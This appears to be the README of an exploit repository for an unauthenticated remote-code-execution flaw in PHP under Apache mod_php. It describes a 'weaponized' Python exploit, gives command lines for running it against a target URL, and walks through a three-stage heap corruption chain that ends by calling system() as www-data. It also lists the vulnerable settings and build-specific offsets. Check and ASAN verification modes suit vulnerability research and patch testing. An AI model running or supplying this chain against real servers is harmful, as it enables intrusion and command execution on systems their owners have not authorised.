# Chain 2: OOM Corruption RCE (CVE-2026-109618)

GHSA-w8hw-w9fx-j79w | CVSS 9.2 | Unauthenticated RCE via PHPSESSID heap leak

## Root cause

When PHP hits `memory_limit` during multipart request processing, `longjmp()` aborts to a `setjmp` recovery point, skipping cleanup of session upload progress structures. These structures retain stale pointers. The next request on the same Apache worker reads the stale `PS(id)`, leaking heap memory via the `PHPSESSID` `Set-Cookie` header.

## Files

| File | Purpose |
|------|---------|
| `poc_rce.py` | Weaponized RCE exploit (stages 1+2+3) with auto-calibration |
| `poc_info_leak.py` | Information disclosure only (stages 1+2) |
| `Dockerfile.asan` | ASAN-instrumented PHP build for UAF verification |
| `verify_uaf.php` | UAF trigger script for ASAN |
| `verify_asan.sh` | Build and run ASAN verification |

## Usage

### Vulnerability check (non-exploitative)

```bash
python3 poc_rce.py --check -u http://TARGET/index.php
python3 poc_rce.py --check -u https://TARGET/index.php    # HTTPS
python3 poc_rce.py --check -u http://TARGET/index.php --memory-limit 32
```

Exit codes: 0 = VULNERABLE, 1 = NOT VULNERABLE, 2 = INCONCLUSIVE

### Full RCE (lab)

```bash
# Auto mode (detects workers, memory_limit, calibrates heap params)
python3 poc_rce.py -u http://127.0.0.1:8896/index.php \
  -c "id>/tmp/pwned" --container modphp-vuln

# Explicit single-worker, skip calibration
python3 poc_rce.py -u http://127.0.0.1:8896/index.php \
  -c "id>/tmp/pwned" --container modphp-vuln \
  --workers 1 --no-calibrate --memory-limit 8

# Extract offsets from container's libphp.so ELF
python3 poc_rce.py -u http://127.0.0.1:8896/index.php \
  -c "id>/tmp/pwned" --container modphp-vuln --extract-offsets
```

### Information disclosure only

```bash
python3 poc_info_leak.py 8896
```

### CLI options

```
-u, --target         Target URL (required)
-c, --command        Command to execute (max 14 bytes, default: id>/tmp/pwned)
--check              Non-exploitative vulnerability check
--workers N          Worker count (default: auto-detect)
--memory-limit N     Memory limit in MB (default: auto-detect)
--profile NAME       Force a build profile
--container NAME     Docker container name (for proof check + offset extraction)
--retries N          Retry count per stage (default: 3)
--no-calibrate       Skip calibration, use profile defaults
--extract-offsets    Extract offsets from container's libphp.so
--php-version X.Y.Z  Override PHP version detection
--docker-cmd CMD     Docker command prefix (default: docker, use 'sg docker -c' on Kali)
```

## Three-stage exploit chain

### Stage 1: Zend MM chunk base leak

1. Request A: 1001 x 1B multipart fields + null PHPSESSID + upload_progress + file + OOM body
2. Request B: `stage1_n` grooming fields of 48B + `forge_len`-byte forged zend_string (fakes len=0x1000)
3. Result: 4096-byte Set-Cookie containing heap pointers; extract 2MB-aligned chunk base

### Stage 2: libphp.so base leak

1. Request A: 1001 x 39B fields + null PHPSESSID + upload_progress + file + OOM body
2. Request B: 983 fields with sub-array at index `stage2_t`
3. Result: 16-byte Set-Cookie containing pDestructor pointer; low 12 bits match zval_ptr_dtor offset

### Stage 3: RCE via fake HashTable

1. Request A: OOM trigger with calibrated padding (6 x 31B pad fields + Cookie header for valid PS(id))
2. Request B: Carrier spray (bin-40 grooming + 15 x 167B fake HashTable with pDestructor = zif_system)
3. Result: Session cleanup calls pDestructor on the fake HT, executing `system(cmd)` as www-data

## Requirements

### Must-have for exploitation

- Apache with mod_php (prefork MPM). FPM workers crash on OOM (exit 70), breaking the cross-request chain.
- `session.upload_progress.enabled = On` (PHP default)
- `session.use_strict_mode = 0` (PHP default)
- Unpatched PHP (< 8.2.35, < 8.3.36, < 8.4.27, < 8.5.12; 7.x and 8.1 are EOL and unpatched)

### The post_max_size gate

The OOM trigger body must reach PHP's multipart parser. Apache rejects bodies larger than `post_max_size` before PHP sees them:

```
post_max_size >= memory_limit + 12M    (required)
```

PHP defaults (`post_max_size=8M`, `memory_limit=128M`) block exploitation. Vulnerable configurations have high `post_max_size` relative to `memory_limit`:
- Upload-heavy apps: `post_max_size=256M`, `memory_limit=32M`
- Lab/CTF setups with custom php.ini
- Servers with `memory_limit=-1` (unlimited) are immune

### Nice-to-have

- `display_errors = On` (enables auto-detection of memory_limit from OOM error; without it, pass `--memory-limit`)
- Low worker count (reduces pinning overhead; 1 worker is simplest)

## Build profiles

Symbol offsets (zif_system, zval_ptr_dtor) are build-specific constants. Shipped profiles:

| Build | Arch | Status |
|-------|------|--------|
| 8.4.26 | amd64 | Verified RCE |
| 8.4.25 | amd64/aarch64 | Offsets verified |
| 8.5.11 | amd64/aarch64 | Offsets verified |
| 8.5.10 | aarch64 | Offsets verified |
| 8.3.35 | amd64 | Offsets verified |
| 8.2.34 | amd64 | Offsets verified |
| 8.2.33 | amd64 | Offsets verified |
| 8.1.31 | amd64 | Offsets verified |
| 7.4.3 | amd64 | Offsets verified |
| 8.5.0, 8.3.0 | amd64 | Offset-only |

For unlisted builds, use `--extract-offsets --container NAME` to parse offsets from the container's libphp.so.

## SAPI behavior

| SAPI | OOM behavior | Exploitable |
|------|-------------|-------------|
| mod_php (prefork) | 200 OK, process survives, stale state persists | Yes |
| mod_php (patched) | 200 OK, process survives, cleanup runs correctly | No |
| PHP-FPM | Worker crashes (exit 70), 502 Bad Gateway | No |
| LiteSpeed LSAPI | Not tested | Unknown |

## ASAN verification

Build PHP with AddressSanitizer to confirm the UAF:

```bash
./verify_asan.sh           # against PHP 8.4.26
./verify_asan.sh 8.4.27    # compare against patched
```

ASAN reports: `heap-use-after-free at php_var_unserialize (var_unserializer.c:849)`

## References

- [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [EDB-52704](https://www.exploit-db.com/exploits/52704) (eness/9bie/OffSec verified exploit)
